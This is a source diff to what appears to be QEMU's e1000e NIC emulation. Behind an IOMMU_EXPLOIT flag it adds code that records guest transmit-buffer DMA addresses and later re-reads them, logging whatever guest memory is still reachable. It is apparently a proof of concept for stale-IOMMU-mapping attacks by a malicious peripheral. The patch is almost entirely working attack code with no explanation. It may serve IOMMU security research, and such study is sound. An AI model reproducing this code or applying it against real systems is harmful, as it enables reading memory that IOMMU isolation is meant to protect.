@@ -53,6 +53,8 @@
                                      second according to spec 10.2.4.2 */
 #define E1000E_MAX_TX_FRAGS (64)
 
+#define IOMMU_EXPLOIT
+
 static inline void
 e1000e_set_interrupt_cause(E1000ECore *core, uint32_t val);
 
@@ -902,6 +904,15 @@ e1000e_rx_ring_init(E1000ECore *core, E1000E_RxRing *rxr, int idx)
     rxr->i      = &i[idx];
 }
 
+#ifdef IOMMU_EXPLOIT
+#define RING_BUF_SIZE 10
+hwaddr mal_tx_addr_ring_buf [RING_BUF_SIZE]; 
+uint32_t mal_tx_valid_ring_buf [RING_BUF_SIZE];
+uint32_t mal_ring_buf_idx = 0;
+hwaddr mal_lasttx_buf_addr;
+uint32_t mal_lasttx_buf_addr_valid = 0;
+#endif
+
 static void
 e1000e_start_xmit(E1000ECore *core, const E1000E_TxRing *txr)
 {
@@ -910,6 +921,9 @@ e1000e_start_xmit(E1000ECore *core, const E1000E_TxRing *txr)
     bool ide = false;
     const E1000E_RingInfo *txi = txr->i;
     uint32_t cause = E1000_ICS_TXQE;
+#ifdef IOMMU_EXPLOIT
+    uint64_t mal_data;
+#endif
 
     if (!(core->mac[TCTL] & E1000_TCTL_EN)) {
         trace_e1000e_tx_disabled();
@@ -919,7 +933,45 @@ e1000e_start_xmit(E1000ECore *core, const E1000E_TxRing *txr)
     while (!e1000e_ring_empty(core, txi)) {
         base = e1000e_ring_head_descr(core, txi);
 
+#ifdef IOMMU_EXPLOIT
+	// This is a debug print
+        //qemu_log("Base addr of the RX ring " "0x%"PRIx64
+	//	", size of desc: %lu\n",base,sizeof(desc));
+#endif
+
         pci_dma_read(core->owner, base, &desc, sizeof(desc));
+
+#ifdef IOMMU_EXPLOIT
+        uint32_t txd_lower = le32_to_cpu(desc.lower.data);
+        uint32_t dtype = txd_lower & 
+		(E1000_TXD_CMD_DEXT | E1000_TXD_DTYP_D);
+
+        if (mal_tx_valid_ring_buf[mal_ring_buf_idx] ==1){
+            uint32_t mal_dma_read_fail = pci_dma_read(core->owner, 
+			    mal_tx_addr_ring_buf[mal_ring_buf_idx], 
+			    &mal_data, sizeof(mal_data));
+            if (!mal_dma_read_fail){
+                qemu_log("Read success addr: 0x%"PRIx64", data: %"PRIx64"\n",
+				mal_tx_addr_ring_buf[mal_ring_buf_idx],
+				mal_data);
+            } else{
+                qemu_log("Read failed addr: 0x%"PRIx64"\n",
+				mal_tx_addr_ring_buf[mal_ring_buf_idx]);
+                mal_tx_valid_ring_buf[mal_ring_buf_idx] =0;
+                if (dtype != E1000_TXD_CMD_DEXT){
+                    mal_tx_valid_ring_buf[mal_ring_buf_idx] = 1;
+                    mal_tx_addr_ring_buf[mal_ring_buf_idx] = desc.buffer_addr;
+                }
+            }
+
+        } else if (dtype != E1000_TXD_CMD_DEXT){
+            mal_tx_valid_ring_buf[mal_ring_buf_idx] = 1;
+            mal_tx_addr_ring_buf[mal_ring_buf_idx] = desc.buffer_addr;
+        }
+        mal_ring_buf_idx += 1;
+        mal_ring_buf_idx = mal_ring_buf_idx%RING_BUF_SIZE;
+
+#endif
 
         trace_e1000e_tx_descr((void *)(intptr_t)desc.buffer_addr,
                               desc.lower.data, desc.upper.data);
